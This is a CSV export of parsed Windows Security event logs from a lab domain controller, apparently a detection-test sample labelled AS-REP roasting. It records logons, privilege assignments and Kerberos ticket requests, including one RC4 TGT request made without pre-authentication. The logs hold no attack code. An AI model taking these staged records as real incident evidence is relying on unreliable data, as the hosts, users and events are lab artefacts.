RecordNumber,EventRecordId,TimeCreated,EventId,Level,Provider,Channel,ProcessId,ThreadId,Computer,ChunkNumber,UserId,MapDescription,UserName,RemoteHost,PayloadData1,PayloadData2,PayloadData3,PayloadData4,PayloadData5,PayloadData6,ExecutableInfo,HiddenRecord,SourceFile,Keywords,ExtraDataOffset,Payload
4,37863,2021-04-29 07:56:22.8909199,4634,LogAlways,Microsoft-Windows-Security-Auditing,Security,608,2240,DC-Server-1.labcorp.local,0,,An account was logged off,,,Target: LABCORP\DC-SERVER-1$,LogonType 3,LogonId: 0xC660C0,,,,,False,/evidence/windows-evtx-hayabusa-samples/CredentialAccess/T1558.004_StealOrForgeKerberosTicketsAS-REP-Roasting_Security.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""TargetUserSid"",""#text"":""S-1-5-18""},{""@Name"":""TargetUserName"",""#text"":""DC-SERVER-1$""},{""@Name"":""TargetDomainName"",""#text"":""LABCORP""},{""@Name"":""TargetLogonId"",""#text"":""0xC660C0""},{""@Name"":""LogonType"",""#text"":""3""}]}}"
5,37864,2021-04-29 07:56:26.4337289,4769,LogAlways,Microsoft-Windows-Security-Auditing,Security,608,2324,DC-Server-1.labcorp.local,0,,A Kerberos service ticket was requested,,::ffff:192.168.1.2:54634,Target: LABCORP.LOCAL\Bob@LABCORP.LOCAL,ServiceName: DC-SERVER-1$,ServiceSid: S-1-5-21-2662618741-3450174888-1698379039-1000,TicketEncryptionType: AES256-CTS-HMAC-SHA1-96,Status: KDC_ERR_NONE - No error - No errors were found.,,,False,/evidence/windows-evtx-hayabusa-samples/CredentialAccess/T1558.004_StealOrForgeKerberosTicketsAS-REP-Roasting_Security.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""TargetUserName"",""#text"":""Bob@LABCORP.LOCAL""},{""@Name"":""TargetDomainName"",""#text"":""LABCORP.LOCAL""},{""@Name"":""ServiceName"",""#text"":""DC-SERVER-1$""},{""@Name"":""ServiceSid"",""#text"":""S-1-5-21-2662618741-3450174888-1698379039-1000""},{""@Name"":""TicketOptions"",""#text"":""0x40800000""},{""@Name"":""TicketEncryptionType"",""#text"":""0x12""},{""@Name"":""IpAddress"",""#text"":""::ffff:192.168.1.2""},{""@Name"":""IpPort"",""#text"":""54634""},{""@Name"":""Status"",""#text"":""0x0""},{""@Name"":""LogonGuid"",""#text"":""45bf7c19-80f0-0327-a7d0-3d28cee31701""},{""@Name"":""TransmittedServices"",""#text"":""-""}]}}"
6,37865,2021-04-29 07:56:26.4359310,4672,LogAlways,Microsoft-Windows-Security-Auditing,Security,608,2324,DC-Server-1.labcorp.local,0,,Administrative logon,LABCORP\Bob (S-1-5-21-2662618741-3450174888-1698379039-1104),,"PrivilegeList: SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege, SeEnableDelegationPrivilege",LogonId: 0xC66373,,,,,,False,/evidence/windows-evtx-hayabusa-samples/CredentialAccess/T1558.004_StealOrForgeKerberosTicketsAS-REP-Roasting_Security.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-2662618741-3450174888-1698379039-1104""},{""@Name"":""SubjectUserName"",""#text"":""Bob""},{""@Name"":""SubjectDomainName"",""#text"":""LABCORP""},{""@Name"":""SubjectLogonId"",""#text"":""0xC66373""},{""@Name"":""PrivilegeList"",""#text"":""SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege, SeEnableDelegationPrivilege""}]}}"
7,37866,2021-04-29 07:56:26.4360541,4624,LogAlways,Microsoft-Windows-Security-Auditing,Security,608,2324,DC-Server-1.labcorp.local,0,,Successful logon,-\-," (192.168.1.2)",Target: LABCORP.LOCAL\Bob,LogonType 3,LogonId: 0xC66373,,,,-,False,/evidence/windows-evtx-hayabusa-samples/CredentialAccess/T1558.004_StealOrForgeKerberosTicketsAS-REP-Roasting_Security.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-0-0""},{""@Name"":""SubjectUserName"",""#text"":""-""},{""@Name"":""SubjectDomainName"",""#text"":""-""},{""@Name"":""SubjectLogonId"",""#text"":""0x0""},{""@Name"":""TargetUserSid"",""#text"":""S-1-5-21-2662618741-3450174888-1698379039-1104""},{""@Name"":""TargetUserName"",""#text"":""Bob""},{""@Name"":""TargetDomainName"",""#text"":""LABCORP.LOCAL""},{""@Name"":""TargetLogonId"",""#text"":""0xC66373""},{""@Name"":""LogonType"",""#text"":""3""},{""@Name"":""LogonProcessName"",""#text"":""Kerberos""},{""@Name"":""AuthenticationPackageName"",""#text"":""Kerberos""},{""@Name"":""WorkstationName""},{""@Name"":""LogonGuid"",""#text"":""1e230fd2-e649-64e2-d8cb-59308358c1ff""},{""@Name"":""TransmittedServices"",""#text"":""-""},{""@Name"":""LmPackageName"",""#text"":""-""},{""@Name"":""KeyLength"",""#text"":""0""},{""@Name"":""ProcessId"",""#text"":""0x0""},{""@Name"":""ProcessName"",""#text"":""-""},{""@Name"":""IpAddress"",""#text"":""192.168.1.2""},{""@Name"":""IpPort"",""#text"":""54633""},{""@Name"":""ImpersonationLevel"",""#text"":""%%1833""},{""@Name"":""RestrictedAdminMode"",""#text"":""-""},{""@Name"":""TargetOutboundUserName"",""#text"":""-""},{""@Name"":""TargetOutboundDomainName"",""#text"":""-""},{""@Name"":""VirtualAccount"",""#text"":""%%1843""},{""@Name"":""TargetLinkedLogonId"",""#text"":""0x0""},{""@Name"":""ElevatedToken"",""#text"":""%%1842""}]}}"
8,37867,2021-04-29 07:56:26.6814878,4769,LogAlways,Microsoft-Windows-Security-Auditing,Security,608,2320,DC-Server-1.labcorp.local,0,,A Kerberos service ticket was requested,,::ffff:192.168.1.2:54636,Target: LABCORP.LOCAL\Bob@LABCORP.LOCAL,ServiceName: DC-SERVER-1$,ServiceSid: S-1-5-21-2662618741-3450174888-1698379039-1000,TicketEncryptionType: AES256-CTS-HMAC-SHA1-96,Status: KDC_ERR_NONE - No error - No errors were found.,,,False,/evidence/windows-evtx-hayabusa-samples/CredentialAccess/T1558.004_StealOrForgeKerberosTicketsAS-REP-Roasting_Security.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""TargetUserName"",""#text"":""Bob@LABCORP.LOCAL""},{""@Name"":""TargetDomainName"",""#text"":""LABCORP.LOCAL""},{""@Name"":""ServiceName"",""#text"":""DC-SERVER-1$""},{""@Name"":""ServiceSid"",""#text"":""S-1-5-21-2662618741-3450174888-1698379039-1000""},{""@Name"":""TicketOptions"",""#text"":""0x40810000""},{""@Name"":""TicketEncryptionType"",""#text"":""0x12""},{""@Name"":""IpAddress"",""#text"":""::ffff:192.168.1.2""},{""@Name"":""IpPort"",""#text"":""54636""},{""@Name"":""Status"",""#text"":""0x0""},{""@Name"":""LogonGuid"",""#text"":""45bf7c19-80f0-0327-a7d0-3d28cee31701""},{""@Name"":""TransmittedServices"",""#text"":""-""}]}}"
9,37868,2021-04-29 07:56:26.6832020,4672,LogAlways,Microsoft-Windows-Security-Auditing,Security,608,2320,DC-Server-1.labcorp.local,0,,Administrative logon,LABCORP\Bob (S-1-5-21-2662618741-3450174888-1698379039-1104),,"PrivilegeList: SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege, SeEnableDelegationPrivilege",LogonId: 0xC66389,,,,,,False,/evidence/windows-evtx-hayabusa-samples/CredentialAccess/T1558.004_StealOrForgeKerberosTicketsAS-REP-Roasting_Security.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-2662618741-3450174888-1698379039-1104""},{""@Name"":""SubjectUserName"",""#text"":""Bob""},{""@Name"":""SubjectDomainName"",""#text"":""LABCORP""},{""@Name"":""SubjectLogonId"",""#text"":""0xC66389""},{""@Name"":""PrivilegeList"",""#text"":""SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege, SeEnableDelegationPrivilege""}]}}"
10,37869,2021-04-29 07:56:26.6832968,4624,LogAlways,Microsoft-Windows-Security-Auditing,Security,608,2320,DC-Server-1.labcorp.local,0,,Successful logon,-\-," (192.168.1.2)",Target: LABCORP.LOCAL\Bob,LogonType 3,LogonId: 0xC66389,,,,-,False,/evidence/windows-evtx-hayabusa-samples/CredentialAccess/T1558.004_StealOrForgeKerberosTicketsAS-REP-Roasting_Security.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-0-0""},{""@Name"":""SubjectUserName"",""#text"":""-""},{""@Name"":""SubjectDomainName"",""#text"":""-""},{""@Name"":""SubjectLogonId"",""#text"":""0x0""},{""@Name"":""TargetUserSid"",""#text"":""S-1-5-21-2662618741-3450174888-1698379039-1104""},{""@Name"":""TargetUserName"",""#text"":""Bob""},{""@Name"":""TargetDomainName"",""#text"":""LABCORP.LOCAL""},{""@Name"":""TargetLogonId"",""#text"":""0xC66389""},{""@Name"":""LogonType"",""#text"":""3""},{""@Name"":""LogonProcessName"",""#text"":""Kerberos""},{""@Name"":""AuthenticationPackageName"",""#text"":""Kerberos""},{""@Name"":""WorkstationName""},{""@Name"":""LogonGuid"",""#text"":""1e230fd2-e649-64e2-d8cb-59308358c1ff""},{""@Name"":""TransmittedServices"",""#text"":""-""},{""@Name"":""LmPackageName"",""#text"":""-""},{""@Name"":""KeyLength"",""#text"":""0""},{""@Name"":""ProcessId"",""#text"":""0x0""},{""@Name"":""ProcessName"",""#text"":""-""},{""@Name"":""IpAddress"",""#text"":""192.168.1.2""},{""@Name"":""IpPort"",""#text"":""54635""},{""@Name"":""ImpersonationLevel"",""#text"":""%%1833""},{""@Name"":""RestrictedAdminMode"",""#text"":""-""},{""@Name"":""TargetOutboundUserName"",""#text"":""-""},{""@Name"":""TargetOutboundDomainName"",""#text"":""-""},{""@Name"":""VirtualAccount"",""#text"":""%%1843""},{""@Name"":""TargetLinkedLogonId"",""#text"":""0x0""},{""@Name"":""ElevatedToken"",""#text"":""%%1842""}]}}"
11,37870,2021-04-29 07:56:26.8693445,4768,LogAlways,Microsoft-Windows-Security-Auditing,Security,608,2324,DC-Server-1.labcorp.local,0,,A Kerberos authentication ticket (TGT) was requested,,::ffff:192.168.1.2:54637,Target: labcorp.local\Alice,ServiceName: krbtgt,ServiceSid: S-1-5-21-2662618741-3450174888-1698379039-502,TicketEncryptionType: RC4-HMAC,Status: KDC_ERR_NONE - No error - No errors were found.,PreAuthType: Logon without Pre-Authentication.,,False,/evidence/windows-evtx-hayabusa-samples/CredentialAccess/T1558.004_StealOrForgeKerberosTicketsAS-REP-Roasting_Security.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""TargetUserName"",""#text"":""Alice""},{""@Name"":""TargetDomainName"",""#text"":""labcorp.local""},{""@Name"":""TargetSid"",""#text"":""S-1-5-21-2662618741-3450174888-1698379039-1103""},{""@Name"":""ServiceName"",""#text"":""krbtgt""},{""@Name"":""ServiceSid"",""#text"":""S-1-5-21-2662618741-3450174888-1698379039-502""},{""@Name"":""TicketOptions"",""#text"":""0x40800010""},{""@Name"":""Status"",""#text"":""0x0""},{""@Name"":""TicketEncryptionType"",""#text"":""0x17""},{""@Name"":""PreAuthType"",""#text"":""0""},{""@Name"":""IpAddress"",""#text"":""::ffff:192.168.1.2""},{""@Name"":""IpPort"",""#text"":""54637""},{""@Name"":""CertIssuerName""},{""@Name"":""CertSerialNumber""},{""@Name"":""CertThumbprint""}]}}"
12,37871,2021-04-29 07:56:26.9808567,4634,LogAlways,Microsoft-Windows-Security-Auditing,Security,608,2240,DC-Server-1.labcorp.local,0,,An account was logged off,,,Target: LABCORP\Bob,LogonType 3,LogonId: 0xC66389,,,,,False,/evidence/windows-evtx-hayabusa-samples/CredentialAccess/T1558.004_StealOrForgeKerberosTicketsAS-REP-Roasting_Security.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""TargetUserSid"",""#text"":""S-1-5-21-2662618741-3450174888-1698379039-1104""},{""@Name"":""TargetUserName"",""#text"":""Bob""},{""@Name"":""TargetDomainName"",""#text"":""LABCORP""},{""@Name"":""TargetLogonId"",""#text"":""0xC66389""},{""@Name"":""LogonType"",""#text"":""3""}]}}"
13,37872,2021-04-29 07:57:22.9035761,4672,LogAlways,Microsoft-Windows-Security-Auditing,Security,608,2320,DC-Server-1.labcorp.local,0,,Administrative logon,LABCORP\DC-SERVER-1$ (S-1-5-18),,"PrivilegeList: SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege, SeEnableDelegationPrivilege",LogonId: 0xC6B108,,,,,,False,/evidence/windows-evtx-hayabusa-samples/CredentialAccess/T1558.004_StealOrForgeKerberosTicketsAS-REP-Roasting_Security.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-18""},{""@Name"":""SubjectUserName"",""#text"":""DC-SERVER-1$""},{""@Name"":""SubjectDomainName"",""#text"":""LABCORP""},{""@Name"":""SubjectLogonId"",""#text"":""0xC6B108""},{""@Name"":""PrivilegeList"",""#text"":""SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege, SeEnableDelegationPrivilege""}]}}"
14,37873,2021-04-29 07:57:22.9038623,4624,LogAlways,Microsoft-Windows-Security-Auditing,Security,608,2320,DC-Server-1.labcorp.local,0,,Successful logon,-\-," (::1)",Target: LABCORP.LOCAL\DC-SERVER-1$,LogonType 3,LogonId: 0xC6B108,,,,-,False,/evidence/windows-evtx-hayabusa-samples/CredentialAccess/T1558.004_StealOrForgeKerberosTicketsAS-REP-Roasting_Security.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-0-0""},{""@Name"":""SubjectUserName"",""#text"":""-""},{""@Name"":""SubjectDomainName"",""#text"":""-""},{""@Name"":""SubjectLogonId"",""#text"":""0x0""},{""@Name"":""TargetUserSid"",""#text"":""S-1-5-18""},{""@Name"":""TargetUserName"",""#text"":""DC-SERVER-1$""},{""@Name"":""TargetDomainName"",""#text"":""LABCORP.LOCAL""},{""@Name"":""TargetLogonId"",""#text"":""0xC6B108""},{""@Name"":""LogonType"",""#text"":""3""},{""@Name"":""LogonProcessName"",""#text"":""Kerberos""},{""@Name"":""AuthenticationPackageName"",""#text"":""Kerberos""},{""@Name"":""WorkstationName""},{""@Name"":""LogonGuid"",""#text"":""58839562-92e0-e8d6-3d3c-c1aeed5c31f6""},{""@Name"":""TransmittedServices"",""#text"":""-""},{""@Name"":""LmPackageName"",""#text"":""-""},{""@Name"":""KeyLength"",""#text"":""0""},{""@Name"":""ProcessId"",""#text"":""0x0""},{""@Name"":""ProcessName"",""#text"":""-""},{""@Name"":""IpAddress"",""#text"":""::1""},{""@Name"":""IpPort"",""#text"":""54371""},{""@Name"":""ImpersonationLevel"",""#text"":""%%1833""},{""@Name"":""RestrictedAdminMode"",""#text"":""-""},{""@Name"":""TargetOutboundUserName"",""#text"":""-""},{""@Name"":""TargetOutboundDomainName"",""#text"":""-""},{""@Name"":""VirtualAccount"",""#text"":""%%1843""},{""@Name"":""TargetLinkedLogonId"",""#text"":""0x0""},{""@Name"":""ElevatedToken"",""#text"":""%%1842""}]}}"
15,37874,2021-04-29 07:57:22.9088466,4634,LogAlways,Microsoft-Windows-Security-Auditing,Security,608,2740,DC-Server-1.labcorp.local,0,,An account was logged off,,,Target: LABCORP\DC-SERVER-1$,LogonType 3,LogonId: 0xC6B108,,,,,False,/evidence/windows-evtx-hayabusa-samples/CredentialAccess/T1558.004_StealOrForgeKerberosTicketsAS-REP-Roasting_Security.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""TargetUserSid"",""#text"":""S-1-5-18""},{""@Name"":""TargetUserName"",""#text"":""DC-SERVER-1$""},{""@Name"":""TargetDomainName"",""#text"":""LABCORP""},{""@Name"":""TargetLogonId"",""#text"":""0xC6B108""},{""@Name"":""LogonType"",""#text"":""3""}]}}"
16,37875,2021-04-29 07:58:02.6525054,4672,LogAlways,Microsoft-Windows-Security-Auditing,Security,608,2324,DC-Server-1.labcorp.local,0,,Administrative logon,LABCORP\DC-SERVER-1$ (S-1-5-18),,"PrivilegeList: SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege, SeEnableDelegationPrivilege",LogonId: 0xC712F1,,,,,,False,/evidence/windows-evtx-hayabusa-samples/CredentialAccess/T1558.004_StealOrForgeKerberosTicketsAS-REP-Roasting_Security.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-18""},{""@Name"":""SubjectUserName"",""#text"":""DC-SERVER-1$""},{""@Name"":""SubjectDomainName"",""#text"":""LABCORP""},{""@Name"":""SubjectLogonId"",""#text"":""0xC712F1""},{""@Name"":""PrivilegeList"",""#text"":""SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege, SeEnableDelegationPrivilege""}]}}"
17,37876,2021-04-29 07:58:02.6526651,4624,LogAlways,Microsoft-Windows-Security-Auditing,Security,608,2324,DC-Server-1.labcorp.local,0,,Successful logon,-\-," (fe80::e50e:b89e:4718:3aa)",Target: LABCORP.LOCAL\DC-SERVER-1$,LogonType 3,LogonId: 0xC712F1,,,,-,False,/evidence/windows-evtx-hayabusa-samples/CredentialAccess/T1558.004_StealOrForgeKerberosTicketsAS-REP-Roasting_Security.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-0-0""},{""@Name"":""SubjectUserName"",""#text"":""-""},{""@Name"":""SubjectDomainName"",""#text"":""-""},{""@Name"":""SubjectLogonId"",""#text"":""0x0""},{""@Name"":""TargetUserSid"",""#text"":""S-1-5-18""},{""@Name"":""TargetUserName"",""#text"":""DC-SERVER-1$""},{""@Name"":""TargetDomainName"",""#text"":""LABCORP.LOCAL""},{""@Name"":""TargetLogonId"",""#text"":""0xC712F1""},{""@Name"":""LogonType"",""#text"":""3""},{""@Name"":""LogonProcessName"",""#text"":""Kerberos""},{""@Name"":""AuthenticationPackageName"",""#text"":""Kerberos""},{""@Name"":""WorkstationName""},{""@Name"":""LogonGuid"",""#text"":""b5ab5ccd-eca4-fc9c-3682-ee24b521fe72""},{""@Name"":""TransmittedServices"",""#text"":""-""},{""@Name"":""LmPackageName"",""#text"":""-""},{""@Name"":""KeyLength"",""#text"":""0""},{""@Name"":""ProcessId"",""#text"":""0x0""},{""@Name"":""ProcessName"",""#text"":""-""},{""@Name"":""IpAddress"",""#text"":""fe80::e50e:b89e:4718:3aa""},{""@Name"":""IpPort"",""#text"":""54374""},{""@Name"":""ImpersonationLevel"",""#text"":""%%1833""},{""@Name"":""RestrictedAdminMode"",""#text"":""-""},{""@Name"":""TargetOutboundUserName"",""#text"":""-""},{""@Name"":""TargetOutboundDomainName"",""#text"":""-""},{""@Name"":""VirtualAccount"",""#text"":""%%1843""},{""@Name"":""TargetLinkedLogonId"",""#text"":""0x0""},{""@Name"":""ElevatedToken"",""#text"":""%%1842""}]}}"
18,37877,2021-04-29 07:58:02.6603670,4672,LogAlways,Microsoft-Windows-Security-Auditing,Security,608,2740,DC-Server-1.labcorp.local,0,,Administrative logon,LABCORP\DC-SERVER-1$ (S-1-5-18),,"PrivilegeList: SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege, SeEnableDelegationPrivilege",LogonId: 0xC713DD,,,,,,False,/evidence/windows-evtx-hayabusa-samples/CredentialAccess/T1558.004_StealOrForgeKerberosTicketsAS-REP-Roasting_Security.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-18""},{""@Name"":""SubjectUserName"",""#text"":""DC-SERVER-1$""},{""@Name"":""SubjectDomainName"",""#text"":""LABCORP""},{""@Name"":""SubjectLogonId"",""#text"":""0xC713DD""},{""@Name"":""PrivilegeList"",""#text"":""SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege, SeEnableDelegationPrivilege""}]}}"
19,37878,2021-04-29 07:58:02.6605822,4624,LogAlways,Microsoft-Windows-Security-Auditing,Security,608,2740,DC-Server-1.labcorp.local,0,,Successful logon,-\-," (::1)",Target: LABCORP.LOCAL\DC-SERVER-1$,LogonType 3,LogonId: 0xC713DD,,,,-,False,/evidence/windows-evtx-hayabusa-samples/CredentialAccess/T1558.004_StealOrForgeKerberosTicketsAS-REP-Roasting_Security.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-0-0""},{""@Name"":""SubjectUserName"",""#text"":""-""},{""@Name"":""SubjectDomainName"",""#text"":""-""},{""@Name"":""SubjectLogonId"",""#text"":""0x0""},{""@Name"":""TargetUserSid"",""#text"":""S-1-5-18""},{""@Name"":""TargetUserName"",""#text"":""DC-SERVER-1$""},{""@Name"":""TargetDomainName"",""#text"":""LABCORP.LOCAL""},{""@Name"":""TargetLogonId"",""#text"":""0xC713DD""},{""@Name"":""LogonType"",""#text"":""3""},{""@Name"":""LogonProcessName"",""#text"":""Kerberos""},{""@Name"":""AuthenticationPackageName"",""#text"":""Kerberos""},{""@Name"":""WorkstationName""},{""@Name"":""LogonGuid"",""#text"":""c5279ba6-ad77-552e-9737-1974e1f4d01f""},{""@Name"":""TransmittedServices"",""#text"":""-""},{""@Name"":""LmPackageName"",""#text"":""-""},{""@Name"":""KeyLength"",""#text"":""0""},{""@Name"":""ProcessId"",""#text"":""0x0""},{""@Name"":""ProcessName"",""#text"":""-""},{""@Name"":""IpAddress"",""#text"":""::1""},{""@Name"":""IpPort"",""#text"":""0""},{""@Name"":""ImpersonationLevel"",""#text"":""%%1833""},{""@Name"":""RestrictedAdminMode"",""#text"":""-""},{""@Name"":""TargetOutboundUserName"",""#text"":""-""},{""@Name"":""TargetOutboundDomainName"",""#text"":""-""},{""@Name"":""VirtualAccount"",""#text"":""%%1843""},{""@Name"":""TargetLinkedLogonId"",""#text"":""0x0""},{""@Name"":""ElevatedToken"",""#text"":""%%1842""}]}}"
20,37879,2021-04-29 07:58:02.6665042,4672,LogAlways,Microsoft-Windows-Security-Auditing,Security,608,2324,DC-Server-1.labcorp.local,0,,Administrative logon,LABCORP\DC-SERVER-1$ (S-1-5-18),,"PrivilegeList: SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege, SeEnableDelegationPrivilege",LogonId: 0xC7142B,,,,,,False,/evidence/windows-evtx-hayabusa-samples/CredentialAccess/T1558.004_StealOrForgeKerberosTicketsAS-REP-Roasting_Security.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-18""},{""@Name"":""SubjectUserName"",""#text"":""DC-SERVER-1$""},{""@Name"":""SubjectDomainName"",""#text"":""LABCORP""},{""@Name"":""SubjectLogonId"",""#text"":""0xC7142B""},{""@Name"":""PrivilegeList"",""#text"":""SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege, SeEnableDelegationPrivilege""}]}}"
